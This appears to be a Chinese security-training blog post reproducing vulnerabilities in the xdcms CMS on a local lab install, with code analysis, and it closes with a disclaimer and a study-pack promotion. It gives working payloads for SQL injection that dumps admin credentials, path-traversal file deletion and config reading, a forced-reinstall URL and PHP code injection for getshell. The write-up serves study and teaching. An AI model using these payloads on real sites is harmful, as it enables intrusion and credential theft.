# 原创
：  xdcms漏洞合集-漏洞复现

# xdcms漏洞合集-漏洞复现

> 
公众号：掌控安全EDU 分享更多技术文章，欢迎关注一起探讨学习


**目录**

[xdcms v3.0.1漏洞](#xdcms%20v3.0.1%E6%BC%8F%E6%B4%9E)

[环境搭建](#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)

[代码审计](#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

[目录总览](#%E7%9B%AE%E5%BD%95%E6%80%BB%E8%A7%88)

[配置文件总览](#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%80%BB%E8%A7%88)

[登陆处sql注入](#%E7%99%BB%E9%99%86%E5%A4%84sql%E6%B3%A8%E5%85%A5)

[漏洞分析](#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[注册处sql注入漏洞](#%E6%B3%A8%E5%86%8C%E5%A4%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)

[漏洞分析](#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[getshell](#getshell)

[任意文件删除](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4)

[xdcms订餐网站管理系统v1.0漏洞](#xdcms%E8%AE%A2%E9%A4%90%E7%BD%91%E7%AB%99%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fv1.0%E6%BC%8F%E6%B4%9E)

[简介](#%E7%AE%80%E4%BB%8B)

[环境搭建](#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)

[全局变量的覆盖](#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E8%A6%86%E7%9B%96)

[漏洞分析](#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[后台任意源码读取](#%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%BA%90%E7%A0%81%E8%AF%BB%E5%8F%96)

[后台getshell](#%E5%90%8E%E5%8F%B0getshell)

[漏洞分析](#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

---


#### xdcms v3.0.1漏洞

##### 环境搭建

1.xdcms_3.0.1 源码，放到WWW目录下面。<br/> 源码下载地址:<br/> 链接：https://pan.baidu.com/s/1JDRfeyPbbpF5br9t6pcNSw<br/> 提取码：zkaq<br/> 2.安装，访问( http://127.0.0.1/xdcms_v3.0.1/install/index.php） 一路选择下一步，直到设置页面，创建数据库……安装完成。

<br/> 输入数据库账号密码（可以选择新建个数据库 xdcms ，不新建也可以，输入数据库的名称即可），点击进行下一步进行网站简单的设置<br/> 可以看到安装成功，请牢记您的管理员账户:xdcms , 密码 xdcms，进入后台管理。

##### 代码审计

###### 目录总览

首先可以拿出来 代码审计工具—Seay源代码审计系统进行自动审计，先看一下哪里容易出问题，从而可以不那么盲目。<br/> 发现 xdcms 的目录很简单，包括后台 admin ，cache ， data ， 系统system ，上传uploadfile。自动扫描出了171个可疑漏洞。

<br/> 这里目录并不是很复杂，也没有采用thinkphp的框架，自己搭建的框架，因此代码还是很容易读懂的！<br/> 首先看到目录，先要找数据库文件，是不是存在默认的下载路径，如果通过这种方法，我们就能直接拿到管理员账号密码，那后续就不需要审计什么了。

<br/> 这里没有什么默认的mdb文件或是sql文件，backup里也为空，因此唯一可能有用的就是config.inc.php文件，但是因为是php，肯定是不显示的，因此这里不存在此类漏洞。<br/> 下面我们可以猜测admin肯定是管理员目录，cache为缓存，估计也没什么用。。<br/> install为安装目录，经常出现的就是任意文件删除漏洞，然后利用这种漏洞删除install目录下的lock文件，导致cms可以进行重装。<br/> system目录应该就是整个网站的组成文件，这个文件夹应该是审计的重点！<br/> 最后是一个上传文件的目录，这个看看有没有任意文件上传漏洞吧。

###### 配置文件总览

下面先看看有哪些配置文件，哪些文件经常引用到，这类文件往往会贯穿整个网站构建过程，一些重要的过滤函数也一般在这类文件中。

这是index.php文件，我们可以看到两个配置文件，下面逐步跟着这些配置文件进行审计。

```

&lt;?php

if(!file_exists("data/config.inc.php")){header("location:install/index.php");exit();}

require dirname(__FILE__).'/system/common.inc.php';

?&gt;
```

进入config.inc.php文件，主要是数据库配置信息。会看到用的是utf-8字符，因此不存在宽字节注入。

<br/> 进入system/common.inc.php文件，应该是整个网站的构架文件，可以看到之前说的system目录为系统目录，另外我们需要注意，在最下面一行，又引用了一个fun.inc.php文件，应该是function的配置文件，这类文件往往就是过滤函数的聚集地。

<br/> 继续仔细看看fun.inc.php文件。这是fun.inc.php的一部分，可以看到这里有两个过滤函数，一个应该是xss过滤，一个是sql过滤。但是这里sql过滤只匹配了小写，因此我们可以利用大小写来进行绕过。因此如果使用了这个safe_html()函数，并且进入了数据库查询，那么这里就一定存在sql注入。

##### 登陆处sql注入

###### 漏洞分析

全局搜索safe_html,很多地方都调用了 但不是所以都存在注入，因为有些地方存在safe_replace与invtal的保护index.php?m=member&amp;f=login_save<br/> 没办法绕过，且xdcms会员管理界面（但是我们暂时不能利用，因为实际我们不知道管理后台账号<br/> member会员界面（单引号包裹且传参只经过safe_html过滤..且开启了报错提示,那就可用报错注入）可以利用报错注入，只要是只将safe_html带入数据库的查询则存在注入，这样就能查询出admin表里面的管理员信息。

/system/module/member/index

<br/> 上面的程序也不是很难读，可以看到POST接收过来登录的账号密码，然后通过 safe_html() 函数 进行过滤，判断是否为空，进而在103行直接带入数据库查询。这里仅仅通过 safe_html() 函数进行了过滤，所以很显然是存在注入的。

###### 漏洞复现

payload：

```
username=bestorange'or updatexml(1,concat(0x7e,(selEct concat(username,0x23,password) frOm c_admin),0x7e),1) #&amp;password=bestorange&amp;submit=+%E7%99%BB+%E5%BD%95+
```

##### 注册处sql注入漏洞

###### 漏洞分析

现在先熟悉一下流程，可以看到能够进行注册登录。<br/> 那就注册一个账号orange，密码orange。

<br/> 上面看到密码是进行了两次md5加密，接下来看一下代码。<br/> /system/modules/member/index.php

<br/> 上面的代码很容易读懂，函数是register_save()，注册保存。首先POST接收传过来的参数，判断是不是为空。<br/> 66行密码进行两次md5加密，可以看到并没有进行明显的过滤，但是在50行和72行看到了过滤函数safe_html()，下面就开始追踪一下这个函数。

```

function safe_html($str){

if(empty($str)){return;}

$str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file

|outfile/','',$str);

return htmlspecialchars($str);

}
```

分析一下这个过滤函数，只是简单的把上面看到的 select ，insert，update 等等替换成了空。<br/> 在 safe_html 处虽然过了个SQL注入的敏感词，还过滤了=和**，但是没有考虑SQL注入敏感词的大小写，这里只过滤了小写，那么我们用大写绕过，这里过滤的=和**，我们可以使用不带*和=的常规保存SQL注入语句。

###### 漏洞复现

这里利用报错注入来进行测试，bestorange’ or updatexml(1,concat(0x7e,(selEct concat(username,0x23,password) frOm c_admin),0x7e),1) #&amp;password=bestorange

payload：

```
username=bestorange' or updatexml(1,concat(0x7e,(selEct concat(username,0x23,password) frOm c_admin),0x7e),1) #&amp;password=bestorange&amp;password2=bestorange&amp;fields%5Btruename%5D=bestorange&amp;fields%5Bemail%5D=bestorange&amp;submit=+%E6%B3%A8+%E5%86%8C+
```

##### getshell

跟着uploadfile文件夹寻找文件上传点，对上传文件后缀进行了限制。<br/> 利用admin后台限制的文件格式更改即可上传木马getshell，也可利用上传文件后进行修改后缀。system/function/upload.inc.php（文中有多个文件上传的点）

通过上面注入得到的管理员的账号密码登录后台，成功进入后台管理系统，在 系统设置—&gt;网站配置—&gt;上传设置—&gt;文件/图片上传格式限制。<br/> 添加php文件类型，然后进行上传即可。

##### 任意文件删除

全局搜file_get_contents意外收获了unlink任意目录文件删除index.php?m=xdcms&amp;c=data&amp;f=delete&amp;file=../../test

```
public function delete(){

$file=trim($_GET["file"]);

$dir=DATA_PATH.'backup/'.$file;

if(is_dir($dir)){

//删除文件夹中的文件

if (false != ($handle = opendir ( $dir ))) {

while ( false !== ($file = readdir ( $handle )) ) {

if ($file != "." &amp;&amp; $file != ".."&amp;&amp;strpos($file,".")) {

@unlink($dir."/".$file);

}

}

closedir ( $handle );

}



@rmdir($dir);//删除目录

}

showmsg(C('success'),'-1');

}
```

这传入的参数没有过滤也没有白名单，直接拼接进dir，要想触发循环就得进行if判断，所以这里只能是../进行目录遍历可控进行任意文件夹删除。

#### xdcms订餐网站管理系统v1.0漏洞

##### 简介

XDcms订餐网站管理系统，主要使用Php+Mysql+Smarty技术基础进行开发，采用OOP（面向对象）方式进行基础运行框架搭建，集成在线订餐、团购、积分商城、优惠券、新闻、在线订单、在线支付、生成订单短信/邮箱通知、点评、Google电子地图、问答、并与支付宝、Dz论坛、短信平台接口完美整合等功能于一体的完全开源的高级订餐网站管理系统。作为国内最受欢迎的PHP类订餐网站系统之一，XDcms在不断提升用户服务、提高产品质量的同时更加注重用户体验。从系统研发至今，历经了数百次的更新修改后，网站的架设与管理变得更加轻松及便捷。

##### 环境搭建

##### 全局变量的覆盖

###### 漏洞分析

/ install/index.php

<br/> 代码的意思是把传入的变量数组遍历赋值,比如 $_GET[‘a’] 赋值为 $a。

传入一个insLockfile判断是否存在。问题在这

<br/> 将直接跳过判断进行安装。<br/> 此时安装的sql数据库文件会记录在 /data/config.inc.php<br/> 利用poc:找到可外连的 mysql (自己去爆破)

###### 漏洞复现

直接访问此地址

```
http://127.0.0.1/xdcms_dc_v1.0/install/index.php?insLockfile=1&amp;step=4&amp;dbhost=localhost&amp;dbname=xdcms&amp;dbuser=root&amp;dbpwd=123456&amp;dbpre=c_&amp;dblang=gbk&amp;adminuser=xdcms&amp;adminpwd=xdcms
```

##### 后台任意源码读取

漏洞文件:system\modules\xdcms\template.php<br/> 在xdcms 目录下看到 template 文件,目测是后台模板编辑。所以首先登陆后台，登陆<br/> http://127.0.0.1/xdcms_dc_v1.0/index.php?m=xdcms&amp;c=template

<br/> 访问：<br/> http://127.0.0.1/xdcms_dc_v1.0/index.php?m=xdcms&amp;c=template&amp;f=edit&amp;file=../../../data/config.inc.php

##### 后台getshell

###### 漏洞分析

/ system/modules/xdcms/ setting.php

<br/> 又是用foreach来数组遍历附值。这里的$info[‘siteurl’]是没有经过处理就直接写进来了。

###### 漏洞复现

访问：/index.php?m=xdcms&amp;c=setting

测试我就只加了这个phpinfo<br/> poc：

```
');?&gt;&lt;?php phpinfo();?&gt;http://127.0.0.1/
```

http://127.0.0.1/xdcms_dc_v1.0/index.php?m=xdcms&amp;c=setting#

> 
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/73e06808072e409eb61389ace1abf542.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/dd501eaecb2a4bbab8a690213172709e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/22dd1cd633324f93906db6aafe67feb7.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/217f11a21d0e40afbb13e3ae543b9318.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/968b8addf972408cb7b7875a6ea45ea9.png" width="665"/>

应急响应笔记

学习路线
